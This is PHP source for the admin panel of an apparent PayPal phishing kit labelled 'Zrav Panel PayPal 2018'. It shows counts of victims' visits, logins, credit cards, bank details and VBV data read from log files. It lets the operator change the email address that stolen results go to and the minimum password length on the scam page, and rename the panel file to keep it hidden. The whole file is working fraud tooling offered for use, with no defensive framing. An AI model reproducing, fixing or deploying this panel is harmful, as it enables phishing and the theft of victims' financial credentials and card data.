<?php

error_reporting(0);
include('../ck_squad_settings.php');
$uriSegments = explode("/", parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH));
$lastUriSegment = array_pop($uriSegments);
?>
<html>
<head>
	<title>Zrav Panel</title>
	<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</head>
<body style="background: black; color: blue;">
	<table width="100%" align="center">
		<tr>
			<td><br/><br/><br/></td>
		</tr>
		<tr align="center">
			<td align="center"><h1><code>Zrav Panel PayPal 2018</code></h1></td>
		</tr>
		<tr>
			<td><br/></td>
		</tr>
		<tr>
			<td align="center">
				<a class="btn btn-primary btn-sm" href="https://<?php echo $_SERVER['SERVER_NAME'];?>" target="_blank">Go To Web</a>
			</td>
		</tr>
	</table>
	<br/>
	<br/>
	<br/>
	<table align="center" width="80%" border="1">
		<tr>
			<td width="50%">
				<form method="POST">
					<table align="center">
						<tr><td colspan="2" align="center"><code>Change Email Result</code></td></tr>
						<tr>
							<td align="center"><code>Old Email</code></td>
							<td align="center"><code>New Email</code></td>
						</tr>
						<tr>
							<td align="center">
								<input type="text" class="form-control-sm" size="30" name="txt_oldemail" value="<?php echo $ck_squad_email; ?>" required=required readonly="">
							</td>
							<td align="center">
								<input type="text" class="form-control-sm" size="30" name="txt_newemail" value"" placeholder="yourmail@domain.com" required=required>
							</td>
						</tr>
						<tr>
							<td align="center" colspan="2">
								<input type="submit" class="btn btn-primary btn-sm" name="change_email" value="Change Email">
							</td>
						</tr>
					</table>
				</form>
			</td>
			<td width="50%">
				<form method="POST">
					<table align="center">
						<tr><td colspan="2" align="center"><code>Change Min Password SC</code></td></tr>
						<tr>
							<td align="center"><code>Length Old</code></td>
							<td align="center"><code>Length New</code></td>
						</tr>
						<tr>
							<td align="center">
								<input type="text" class="form-control-sm" size="15" name="txt_oldpassword" value="<?php echo $ck_squad_minpass; ?>" required="required" readonly="">
							</td>
							<td align="center">
								<input type="text" class="form-control-sm" size="15" name="txt_newpassword" placeholder="New" value="" required=required>
							</td>
						</tr>
						<tr>
							<td colspan="2" align="center">
								<input type="submit" class="btn btn-primary btn-sm" name="change_password" value="Change Password">
							</td>
						</tr>
					</table>
				</form>
			</td>
		</tr>
		<tr>
			<td width="50%">
				<form method="POST">
					<table align="center">
						<tr><td colspan="2" align="center"><code>Change Parameter Panel</code></td></tr>
						<tr>
							<td align="center"><code>Old Key</code></td>
							<td align="center"><code>New Key</code></td>
						</tr>
						<tr>
							<td align="center">
								<input type="text" class="form-control-sm" size="15" name="txt_oldpanel" value="<?php echo $lastUriSegment; ?>" required="required" readonly="">
								<input type="hidden" class="form-control-sm" size="15" name="txt_oldpanelphp" value="<?php echo $lastUriSegment. ".php"; ?>" required="required" readonly="">
							</td>
							<td align="center">
								<input type="text" class="form-control-sm" size="15" name="txt_newpanel" id="txt_newpanel" maxlength="8" placeholder="key_baru" value="" required=required>
							</td>
						</tr>
						<tr>
							<td align="center" colspan="2">
								<input type="submit" class="btn btn-primary btn-sm" name="change_panel" id="id_change_panel" value="Change Panel">
							</td>
						</tr>
					</table>
				</form>
			</td>
			<td width="50%">
				<form method="POST">
					<table align="center">
						<tr>
							<td width="20%" align="center">
								<button type="button" class="btn btn-warning btn-sm">
									Visitor's <span class="badge badge-light"><?php echo empty(@file_get_contents("../ck_squad_logs/visitor.txt")) ? "0" : @file_get_contents("../ck_squad_logs/visitor.txt"); ?></span>
									<span class="sr-only">unread messages</span>
								</button>
							</td>
							<td width="20%" align="center">
								<button type="button" class="btn btn-warning btn-sm">
									Login's <span class="badge badge-light"><?php echo empty(@file_get_contents("../ck_squad_logs/login.txt")) ? "0" : @file_get_contents("../ck_squad_logs/login.txt"); ?></span>
									<span class="sr-only">unread messages</span>
								</button>
							</td>
							<td width="20%" align="center">
								<button type="button" class="btn btn-warning btn-sm">
									Cc's <span class="badge badge-light"><?php echo empty(@file_get_contents("../ck_squad_logs/cc.txt")) ? "0" : @file_get_contents("../ck_squad_logs/cc.txt"); ?></span>
									<span class="sr-only">unread messages</span>
								</button>
							</td>
							<td width="20%" align="center">
								<button type="button" class="btn btn-warning btn-sm">
									Bank's <span class="badge badge-light"><?php echo empty(@file_get_contents("../ck_squad_logs/bank.txt")) ? "0" : @file_get_contents("../ck_squad_logs/bank.txt"); ?></span>
									<span class="sr-only">unread messages</span>
								</button>
							</td>
							<td width="20%" align="center">
								<button type="button" class="btn btn-warning btn-sm">
									Vbv's <span class="badge badge-light"><?php echo empty(@file_get_contents("../ck_squad_logs/vbv.txt")) ? "0" : @file_get_contents("../ck_squad_logs/vbv.txt"); ?></span>
									<span class="sr-only">unread messages</span>
								</button>
							</td>
						</tr>
					</table>
				</form>
			</td>
		</tr>
	</table>
	<?php
	@unlink("set.php");

	$oldemail   = trim(@$_POST['txt_oldemail']);
	$newemail   = trim(@$_POST['txt_newemail']);
	$oldpassword   = trim(@$_POST['txt_oldpassword']);
	$newpassword   = trim(@$_POST['txt_newpassword']);
	$oldpanel   = trim(@$_POST['txt_oldpanel']);
	$newpanel   = trim(@$_POST['txt_newpanel']);
	$oldpanelphp   = trim(@$_POST['txt_oldpanelphp']);
	$file   = "../ck_squad_settings.php";
	$isi    = @file_get_contents($file);

	if(isset($_POST['change_email'])) {
		if(@preg_match("#\b$oldemail\b#is", $isi)) {
			$isi = str_replace($oldemail,$newemail,$isi);
			$open = @fopen($file,'w');
			@fwrite($open,$isi);
			fclose($open);

			echo "<script>alert('DONE ZRAV PROTECT')</script>";
			echo "<meta http-equiv='refresh' content='0; url=#/>";
		}
		else{
			echo "<script>alert('Failed {error: 420}')</script>";
		}
	}

	if(isset($_POST['change_password'])) {
		if(@preg_match("#\b$oldpassword\b#is", $isi)) {
			$isi = str_replace($oldpassword,$newpassword,$isi);
			$open = @fopen($file,'w');
			@fwrite($open,$isi);
			fclose($open);

			echo "<script>alert('DONE ZRAV PROTECT')</script>";
			echo "<meta http-equiv='refresh' content='0; url=#'/>";
		}
		else{
			echo "<script>alert('Failed {error: 420}')</script>";
		}
	}

	if(isset($_POST['change_panel'])) {
		if(@preg_match("#\b$oldpassword\b#is", $isi)) {
			$oldpanelname = $oldpanelphp;
			$ext = strtolower(substr($oldpanelname, strripos($oldpanelname, '.')+1));

			$newpanelname = $newpanel.'.'.$ext;

			$fileAwal = $oldpanelname;
			$fileBaru = $newpanelname;
			rename($fileAwal, $fileBaru);

			echo "<script>alert('DONE ZRAV PROTECT')</script>";
			echo "<meta http-equiv='refresh' content='0; url=http://$_SERVER[HTTP_HOST]/zrav/$newpanel'/>";
		}else{
			echo "<script>alert('Failed {error: 420}')</script>";
		}
	}
	?>
</body>
</html>